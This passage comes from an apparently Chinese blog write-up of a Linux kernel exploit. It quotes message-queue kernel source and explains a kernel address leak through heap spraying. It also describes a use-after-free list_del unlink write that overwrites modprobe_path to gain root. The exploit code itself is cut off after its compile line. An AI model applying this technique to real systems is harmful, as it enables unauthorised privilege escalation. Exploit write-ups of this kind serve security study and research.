(unlikely(f.file-&gt;f_op != &amp;mqueue_file_operations)) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line">info = MQUEUE_I(inode);</span><br><span class="line">audit_file(f.file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!(f.file-&gt;f_mode &amp; FMODE_READ))) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* checks if buffer is big enough */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(msg_len &lt; info-&gt;attr.mq_msgsize)) &#123;</span><br><span class="line">ret = -EMSGSIZE;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * msg_insert really wants us to have a valid, spare node struct so</span></span><br><span class="line"><span class="comment"> * it doesn&#x27;t have to kmalloc a GFP_ATOMIC allocation, but it will</span></span><br><span class="line"><span class="comment"> * fall back to that if necessary.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache)</span><br><span class="line">new_leaf = kmalloc(<span class="keyword">sizeof</span>(*new_leaf), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;info-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;</span><br><span class="line"><span class="comment">/* Save our speculative allocation into the cache */</span></span><br><span class="line">INIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);</span><br><span class="line">info-&gt;node_cache = new_leaf;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(new_leaf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info-&gt;attr.mq_curmsgs == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (f.file-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">spin_unlock(&amp;info-&gt;lock);</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">wait.task = current;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* memory barrier not required, we hold info-&gt;lock */</span></span><br><span class="line">WRITE_ONCE(wait.state, STATE_NONE);</span><br><span class="line">ret = wq_sleep(info, RECV, timeout, &amp;wait);</span><br><span class="line">msg_ptr = wait.msg;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">msg_ptr = msg_get(info);</span><br><span class="line"></span><br><span class="line">inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime =</span><br><span class="line">current_time(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is now free space in queue. */</span></span><br><span class="line">pipelined_receive(&amp;wake_q, info);</span><br><span class="line">spin_unlock(&amp;info-&gt;lock);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">ret = msg_ptr-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((u_msg_prio &amp;&amp; put_user(msg_ptr-&gt;m_type, u_msg_prio)) ||</span><br><span class="line">store_msg(u_msg_ptr, msg_ptr, msg_ptr-&gt;m_ts)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line">free_msg(msg_ptr);</span><br><span class="line">&#125;</span><br><span class="line">out_fput:</span><br><span class="line">fdput(f);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先拿到<code>file_inode</code>，接着通过<code>msg_get</code>拿到对应的msg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct msg_msg *<span class="title">msg_get</span><span class="params">(struct mqueue_inode_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">parent</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">leaf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">try_again:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * During insert, low priorities go to the left and high to the</span></span><br><span class="line"><span class="comment"> * right.  On receive, we want the highest priorities first, so</span></span><br><span class="line"><span class="comment"> * walk all the way to the right.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">parent = info-&gt;msg_tree_rightmost;</span><br><span class="line"><span class="keyword">if</span> (!parent) &#123;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;attr.mq_curmsgs) &#123;</span><br><span class="line">pr_warn_once(<span class="string">&quot;Inconsistency in POSIX message queue, &quot;</span></span><br><span class="line">     <span class="string">&quot;no tree element, but supposedly messages &quot;</span></span><br><span class="line">     <span class="string">&quot;should exist!\n&quot;</span>);</span><br><span class="line">info-&gt;attr.mq_curmsgs = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">leaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(list_empty(&amp;leaf-&gt;msg_list))) &#123;</span><br><span class="line">pr_warn_once(<span class="string">&quot;Inconsistency in POSIX message queue, &quot;</span></span><br><span class="line">     <span class="string">&quot;empty leaf node but we haven&#x27;t implemented &quot;</span></span><br><span class="line">     <span class="string">&quot;lazy leaf delete!\n&quot;</span>);</span><br><span class="line">msg_tree_erase(leaf, info);</span><br><span class="line"><span class="keyword">goto</span> try_again;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">msg = list_first_entry(&amp;leaf-&gt;msg_list,</span><br><span class="line">       struct msg_msg, m_list);</span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;leaf-&gt;msg_list)) &#123;</span><br><span class="line">msg_tree_erase(leaf, info);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info-&gt;attr.mq_curmsgs--;</span><br><span class="line">info-&gt;qsize -= msg-&gt;m_ts;</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后通过<code>store_msg</code>将消息发送到用户态，最后再<code>free</code>掉对应的msg结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_msg</span><span class="params">(struct msg_msg *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">seg = msg-&gt;next;</span><br><span class="line">kfree(msg);</span><br><span class="line"><span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line">kfree(seg);</span><br><span class="line">seg = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在释放函数中可以看到在开头位置会释放掉<code>security</code>但是这个是不可控的，如果不为0大概率会造成<code>kernel panic</code>所以要确保为0。并且可以看到这里并没有像以前那样可以用<code>MSG_COPY</code>来解决，并且在<code>copy_to_user</code>函数中会检测读取内容是否超过了堆块大小所以最多读取<code>0x10</code>的内容，所以只能寻求新的方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>值得注意的是前面提到的<code>user_key_payload</code>结构体的前面<code>0x10</code>个字节其实是如上结构体，他的前八个字节默认为0，并且func是指向<code>user_free_payload_rcu</code>函数的，所以保证了<code>security</code>为0并且可以成功泄漏出内核地址。</p><p>所以这里需要确保<code>user_free_payload_rcu</code>结构体紧贴<code>posix_msg_tree_node</code>结构体的<code>next</code>指针指向的位置，所以可以先用<code>io_uring</code>占位，在申请第二个<code>expr</code>之前释放掉，这是大概率就会挤在一起了，这时在进行堆喷<code>user_free_payload_rcu</code>即可实现。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>至此来看约束条件还是比较多的，并不能实现传统意义上的任意地址写，不过在以往的一篇文章中介绍过<code>modprobe_path</code>这一个内核全局变量。</p><p><img   src="/images/7-1675211987.png"  alt="侵删"></p><p>这一步的构造方式和上述其实类似，也是通过堆喷<code>posix_msg_tree_node</code>结构体再通过<code>UAF</code>使其指向一个<code>object</code>，不过最后其指向的<code>object</code>是会被<code>free</code>掉的，那么紧接着堆喷<code>usr_key_payload</code>结构体，那么此时一个<code>msg_msg</code>结构体被两个<code>usr_key_payload</code>结构体所裹挟了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del(struct list_head * prev, struct list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">next-&gt;prev = prev;</span><br><span class="line">WRITE_ONCE(prev-&gt;next, next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del_entry(struct list_head *entry)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!__list_del_entry_valid(entry))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">__list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_del_entry(entry);</span><br><span class="line">entry-&gt;next = LIST_POISON1;</span><br><span class="line">entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在读取消息时会调用<code>msg_get</code>函数获取到<code>msg_msg</code>结构体，并且在获取的时候紧跟着的就是<code>list_del</code>从链表中删除掉，可以看到其中出现了对指针的指针赋值的操作，这个操作其实在用户态堆中的<code>unlink</code>的时候就已经接触过了，所以如果我们可以控制<code>prev</code>和<code>next</code>那么就可以实现不任意地址写不任意值了，具体要求肯定就是保证两个指针都是可写的。那么这里可以使用<code>0xffff????2f706d74</code>进行写<code>modprobe_path</code>位置，最终的效果就为<code>/tmp/????xffxffprobe</code>，这的<code>????</code>是前面泄漏出来的堆地址。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>这里exp就直接用他的了( 因为我也不熟悉该模块所以就算自己写也会和他的大差不差 )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -o exp -l mnl -l nftnl -w</span></span><br><span class="line"><span class="meta">#<span 